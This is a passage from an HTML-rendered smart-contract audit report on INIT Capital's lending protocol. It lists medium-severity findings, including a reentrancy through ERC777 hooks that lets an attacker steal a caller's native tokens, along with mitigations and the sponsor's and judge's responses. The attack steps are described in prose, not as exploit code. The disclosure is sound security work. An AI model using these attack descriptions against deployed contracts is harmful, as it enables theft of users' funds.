d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VsCode</p>\n<h3 id=\"recommended-mitigation-steps-8\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-8\" aria-label=\"recommended mitigation steps 8 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Do not allow user to move blacklisted collateral to the new mode.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-12-initcapital-findings/issues/22#issuecomment-1870308603\">fez-init (INIT) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>Will add whitelist check.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-07-malicious-user-can-steal-native-tokens-of-moneymarkethook-caller\" style=\"position:relative;\"><a href=\"#m-07-malicious-user-can-steal-native-tokens-of-moneymarkethook-caller\" aria-label=\"m 07 malicious user can steal native tokens of moneymarkethook caller permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-12-initcapital-findings/issues/19\">[M-07] Malicious user can steal native tokens of MoneyMarketHook caller</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-12-initcapital-findings/issues/19\">rvierdiiev</a></em></p>\n<p>MoneyMarketHook allows user to chain some actions into one multicall to the InitCore. In the end user can get all wrapped native tokens that he withdrew <a href=\"https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/hook/MoneyMarketHook.sol#L76-L80\">in a form of native token</a>. Note, that this part of code withdraws all balance from wrapped token and the sends all balance to the <code>msg.sender</code>. In case if balance of contract is 0, then the call will still succeed.</p>\n<p>One type of actions that caller can do using <code>execute</code> function <a href=\"https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/hook/MoneyMarketHook.sol#L124\">is withdraw</a>. In case if caller needs to repay funds to other address then he can provide it <a href=\"https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/hook/MoneyMarketHook.sol#L181\">as <code>to</code> param</a>. So as result, <code>IInitCore.burnTo</code> will transfer pool tokens <a href=\"https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/hook/MoneyMarketHook.sol#L192\">to the provided recipient</a>. And in case if token has a hook, like erc777 or erc677, then receiver will be triggered and he has execution control now.</p>\n<p>User can have <a href=\"https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/hook/MoneyMarketHook.sol#L173\">multiple withdraws in same multicall</a>. And it’s possible that first withdraw is wrapped native token withdraw(which user would like to receive as native) and next withdraw is with erc777 token and other recipient.</p>\n<p>In such case, when first withdraw is done, then wrapped token is already on MoneyMarketHook balance. And then when second withdraw is handled and attacker get hook, then he can call MoneyMarketHook.execute(it doesn’t have reentrancy check) again with any params that just should pass and <code>_params.returnNative</code> as true. Then all wrapped token balance will be sent to the attacker and then execution will return back to the victim and it will send 0 amount as native token to the victim.</p>\n<p>As result attacker is able to steal user’s native tokens.</p>\n<p>From the readme, it’s clear that only fee on transfer tokens are not supported and erc777 are supported:</p>\n<blockquote>\n<p>Please list specific ERC20 that your protocol is anticipated to interact with. Could be “any” (literally anything, fee on transfer tokens, ERC777 tokens and so forth) or a list of tokens you envision using on launch.<br>\nNo fee-on-transfer tokens</p>\n</blockquote>\n<h3 id=\"impact-2\" style=\"position:relative;\"><a href=\"#impact-2\" aria-label=\"impact 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>It’s possible to steal user’s funds.</p>\n<h3 id=\"tools-used-4\" style=\"position:relative;\"><a href=\"#tools-used-4\" aria-label=\"tools used 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VsCode</p>\n<h3 id=\"recommended-mitigation-steps-9\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-9\" aria-label=\"recommended mitigation steps 9 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Add reentrancy check to the <code>execute</code> function.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-12-initcapital-findings/issues/19#issuecomment-1870299489\">fez-init (INIT) confirmed, but disagreed with severity and commented</a>:</strong></p>\n<blockquote>\n<p>This should be a medium issue. There are multiple things that needs to be aligned, including:</p>\n<ul>\n<li>supporting of ERC777. We did not intend to support ERC777, but acknowledge that it may not be communicated clearly.</li>\n<li>the victim needs to specify a certain malicious <code>to</code> contract for the attack to happen.</li>\n</ul>\n</blockquote>\n<blockquote>\n<p>We will add reentrancy check to the execute function to prevent this kind of scenario anyways.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-12-initcapital-findings/issues/19#issuecomment-1870758513\">hansfriese (Judge) decreased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>I agree Medium is appropriate due to this requirement: “the victim needs to specify a certain malicious <code>to</code> contract for the attack to happen”.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-08-trst-m-8-from-previous-audit-still-present\" style=\"position:relative;\"><a href=\"#m-08-trst-m-8-from-previous-audit-still-present\" aria-label=\"m 08 trst m 8 from previous audit still present permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-12-initcapital-findings/issues/17\">[M-08] <code>TRST-M-8</code> from previous audit still present</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-12-initcapital-findings/issues/17\">rvierdiiev</a>, also found by <a href=\"https://github.com/code-423n4/2023-12-initcapital-findings/issues/27\">said</a> and <a href=\"https://github.com/code-423n4/2023-12-initcapital-findings/issues/20\">ladboy233</a></em></p>\n<p>Interest accruing is not paused, when repaying is not allowed.</p>\n<h3 id=\"proof-of-concept-8\" style=\"position:relative;\"><a href=\"#proof-of-concept-8\" aria-label=\"proof of concept 8 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>TRST-M-8 from previous audit describes the fact, that when repaying is paused, then pool still continue accruing interests. Usually this is not considered as a medium bug anymore.\nHowever, protocol team has stated that they have fixed everything.</p>\n<p>I should say that TRST-M-8 still exists and in case repayment will be paused and user will not be able to reduce their debt, their debt shares will continue to accrue interest.</p>\n<h3 id=\"tools-used-5\" style=\"position:relative;\"><a href=\"#tools-used-5\" aria-label=\"tools used 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VsCode</p>\n<h3 id=\"recommended-mitigation-steps-10\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-10\" aria-label=\"recommended mitigation steps 10 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>You can implement the logic that will pause all interest accruing as well, but I am not sure this is indeed needed.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-12-initcapital-findings/issues/17#issuecomment-1870188388\">fez-init (INIT) acknowledged and commented</a>:</strong></p>\n<blockquote>\n<p>There might have been miscommunications with this issue being resolved. This issue from Trust should be communicated as acknowledged.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-12-initcapital-findings/issues/17#issuecomment-1871329916\">hansfriese (Judge) commented</a>:</strong></p>\n<blockquote>\n<p>According to the sponsor’s comment, it’s worth keeping it as a valid medium.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-09-if-wlp-is-blacklisted-then-user-will-not-be-able-to-withdraw-it\" style=\"position:relative;\"><a href=\"#m-09-if-wlp-is-blacklisted-then-user-will-not-be-able-to-withdraw-it\" aria-label=\"m 09 if wlp is blacklisted then user will not be able to withdraw it permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-12-initcapital-findings/issues/13\">[M-09] If wLP is blacklisted, then user will not be able to withdraw it</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-12-initcapital-findings/issues/13\">rvierdiiev</a>, also found by <a href=\"https://github.com/code-423n4/2023-12-initcapital-findings/issues/47\">ladboy233</a> and <a href=\"https://github.com/code-423n4/2023-12-initcapital-findings/issues/41\">0x73696d616f</a></em></p>\n<p>When users deposit wLP tokens as collateral, then they are checked <a href=\"https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/core/InitCore.sol#L255\">to be whitelisted</a>.</p>\n<p>Later, it’s possible that for some reason wLP token <a href=\"https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/core/Config.sol#L145\">will be blacklisted</a> by governor. And once it’s done, then users who already used that wLP token as collateral <a href=\"https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/core/InitCore.sol#L275\">will not be able to withdraw them</a>.</p>\n<p>Also same thing exists for the <code>liquidateWLp</code> function, which means that in case if position, that is collateralized with wLP that is blacklisted, will become unhealthy, then liquidators <a href=\"https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/core/InitCore.sol#L327\">will not be able to liquidate it</a>.</p>\n<p>Sponsor said that blacklisting flow will be as following.</p>\n<ul>\n<li>Decrease collateral factor for blacklisted wLp until it becomes 0</li>\n<li>then blacklist wLp</li>\n</ul>\n<p>Considering this fact I realize that for liquidation this will not be an issue as wLp will have 0 collateralization power when it will be blacklisted. However it’s still possible that some users will not decollateralize their wLp tokens yet for some reasom and thus they will not be able to withdraw them later.</p>\n<h3 id=\"impact-3\" style=\"position:relative;\"><a href=\"#impact-3\" aria-label=\"impact 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>User can’t withdraw previously deposited wLP tokens after they were blacklisted.</p>\n<h3 id=\"tools-used-6\" style=\"position:relative;\"><a href=\"#tools-used-6\" aria-label=\"tools used 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VsCode</p>\n<h3 id=\"recommended-mitigation-steps-11\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-11\" aria-label=\"recommended mitigation steps 11 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Even if wLP token is blacklisted now, you still should allow user to withdraw them. After all you have health check function that will guarantee that position has enough collateral.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-12-initcapital-findings/issues/13#issuecomment-1870294773\">fez-init (INIT) acknowledged and commented</a>:</strong></p>\n<blockquote>\n<p>We will use unwhitelisting with care.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-10-lack-of-way-to-handle-not-fully-repaid-bad-debt-after-liquidation-after-the-lending-pool-share-or-wlp-are-fully-seized\" style=\"position:relative;\"><a href=\"#m-10-lack-of-way-to-handle-not-fully-repaid-bad-debt-after-liquidation-after-the-lending-pool-share-or-wlp-are-fully-seized\" aria-label=\"m 10 lack of way to handle not fully repaid bad debt after liquidation after the lending pool share or wlp are fully seized permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-12-initcapital-findings/issues/9\">[M-10] Lack of way to handle not fully repaid bad debt after liquidation after the lending pool share or WLP are fully seized</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-12-initcapital-findings/issues/9\">ladboy233</a>, also found by <a href=\"https://github.com/code-423n4/2023-12-initcapital-findings/issues/15\">rvierdiiev</a></em></p>\n<p>When user has bad debt, user’s borrow credit > collateral credit. Liqudiator can step in and liquidate and seize user’s share or seize user WLP and repay the debt.</p>\n<p>While the liquidate function aims to let liqudiator take the min share available for bad debt repayment.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"20\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// take min of what&#39;s available (for bad debt repayment)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">shares</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">shares</span><span class=\"mtk1\">.</span><span class=\"mtk11\">min</span><span class=\"mtk1\">(</span><span class=\"mtk11\">IPosManager</span><span class=\"mtk1\">(</span><span class=\"mtk12\">POS_MANAGER</span><span class=\"mtk1\">).</span><span class=\"mtk11\">getCollAmt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_posId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_poolOut</span><span class=\"mtk1\">)); </span><span class=\"mtk3\">// take min of what&#39;s available</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">_require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">shares</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk12\">_minShares</span><span class=\"mtk1\">, </span><span class=\"mtk12\">Errors</span><span class=\"mtk1\">.</span><span class=\"mtk12\">SLIPPAGE_CONTROL</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>After the user’s pool share is transferred out, or after user’s WLP is seized, the rest of unpaid debt becomes bad debt permanently. For example, user’s borrow 1000 USDT and has debt 1000 USDT. His share is only worth 500 USD as collateral price drops. Because the code lets liquidator take min of what’s available for both lending pool share and take min of what’s available (for bad debt repayment) for WLP amount. The liqudiator can repay 800 USD and seize share of 500 USD. However, there are 200 USD remaining debt. When other liquidators (even this liquidator belongs to protocol) writes to repay and erase the rest 200 USD bad debt, he cannot because <a href=\"https://github.com/code-423n4/2023-12-initcapital/blob/a53e401529451b208095b3af11862984d0b32177/contracts/core/PosManager.sol#L235\">removeCollateralTo validates share > 0, if share is 0, revert</a>.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"21\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">_require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_shares</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk12\">Errors</span><span class=\"mtk1\">.</span><span class=\"mtk12\">ZERO_VALUE</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>If the underlying collateral is WLP, the second liquidation aims to write off bad debt does not work as well because if all WLP is transfered out, calling <a href=\"https://github.com/code-423n4/2023-12-initcapital/blob/a53e401529451b208095b3af11862984d0b32177/contracts/core/PosManager.sol#L265\">_harvest and unwrap again is likely to revert</a>.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"22\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">_harvest</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_posId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_wLp</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_tokenId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">IBaseWrapLp</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_wLp</span><span class=\"mtk1\">).</span><span class=\"mtk11\">unwrap</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_tokenId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_amt</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_receiver</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>The bad permanently inflates the totalAssets() in lending pool and inflates the total debt to not let other users borrow from protocol because of the borrow cap checks.</p>\n<p>Also, the lender suffers the loss because if the bad debt is not repaid, the lender that deposit cash into the lending pool is lost.</p>\n<h3 id=\"recommended-mitigation-steps-12\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-12\" aria-label=\"recommended mitigation steps 12 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Add a way to handle not fully repaid bad debt after liquidation after the lending pool share or WLP is fully seized.</p>\n<p>Add a function to donate to the lending pool to let user supply asset or add a function to socialize the bad debt as loss explicilty.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-12-initcapital-findings/issues/9#issuecomment-1869836241\">fez-init (INIT) confirmed</a></strong></p>\n<hr>\n<h2 id=\"m-11-api3-oracle-timestamp-can-be-set-to-future-timestamp-and-block-api3-oracle-usage-to-make-code-revert-in-underflow\" style=\"position:relative;\"><a href=\"#m-11-api3-oracle-timestamp-can-be-set-to-future-timestamp-and-block-api3-oracle-usage-to-make-code-revert-in-underflow\" aria-label=\"m 11 api3 oracle timestamp can be set to future timestamp and block api3 oracle usage to make code revert in underflow permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-12-initcapital-findings/issues/4\">[M-11] API3 oracle timestamp can be set to future timestamp and block API3 Oracle usage to make code revert in underflow</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-12-initcapital-findings/issues/4\">ladboy233</a>, also found by <a href=\"https://github.com/code-423n4/2023-12-initcapital-findings/issues/39\">0x73696d616f</a></em></p>\n<p>In the Api3OracleReader.sol, the code assumes tha the timestamp returned from oracle is always in the past.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"23\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">getPrice_e36</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_token</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">price_e36</span><span class=\"mtk1\">) 